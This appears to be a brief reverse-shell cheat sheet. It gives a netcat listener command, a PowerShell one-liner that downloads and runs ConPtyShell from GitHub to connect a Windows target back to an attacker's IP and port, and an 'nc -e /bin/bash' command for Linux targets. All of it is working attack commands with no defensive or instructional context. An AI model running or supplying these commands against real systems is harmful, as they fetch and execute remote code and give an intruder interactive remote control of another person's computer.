For the Listener on windows the command will be: stty raw -echo; (stty size; cat) | nc -lvnp [PORT]
this listener only works for a windows target.

What you need to do on the target computer if it is a windows computer is: IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell [IP ADRESS] [PORT]

if your target is a linux computer you will use: nc -e /bin/bash [IP ADRESS] [PORT]

